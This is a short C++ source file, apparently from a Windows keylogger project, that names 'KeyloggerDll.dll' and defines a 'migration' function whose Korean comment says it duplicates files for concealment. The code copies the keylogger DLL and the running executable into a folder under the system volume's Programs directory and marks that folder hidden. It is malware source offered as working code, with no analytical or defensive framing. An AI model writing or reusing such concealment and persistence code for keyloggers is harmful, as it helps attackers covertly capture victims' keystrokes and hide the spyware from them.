#include "pch.h"
#include <iostream>
#include <windows.h>
#include <direct.h>
#include <fstream>

#define DLL_NAME "KeyloggerDll.dll"
using namespace std;

void getSystemVolume(TCHAR *vol)
{
	TCHAR buffer[30];

	GetSystemWindowsDirectory(buffer, 30);
	for (int i = 0; i < 2; i++)
	{
		vol[i] = buffer[i];
	}
	vol[2] = 0;
}

void migration(char *filepath) {	// 은신을 위한 파일 복제 함수
	TCHAR vol[3];
	char *filename = NULL;
	string path = "\\Programs\\";

	GetModuleFileNameA(NULL, filepath, MAX_PATH);
	getSystemVolume(vol);
	wstring volume(&vol[0]);
	string migrate_path(volume.begin(), volume.end());
	migrate_path.append(path);

	ifstream dll_src(DLL_NAME, ios::binary);
	ofstream dll_dst(migrate_path + DLL_NAME, ios::binary);
	dll_dst << dll_src.rdbuf();

	ifstream app_src(filepath, ios::binary);
	CreateDirectoryA(migrate_path.c_str(), NULL);
	SetFileAttributesA(migrate_path.c_str(), FILE_ATTRIBUTE_HIDDEN);
	char *ptr = strtok(filepath, "\\");
	while (ptr != NULL) {
		filename = ptr;		// while문 마지막에 들어간 ptr 값이 filename
		ptr = strtok(NULL, "\\");
	}
	migrate_path.append(filename);
	ofstream app_dst(migrate_path, ios::binary);
	
	app_dst << app_src.rdbuf();
}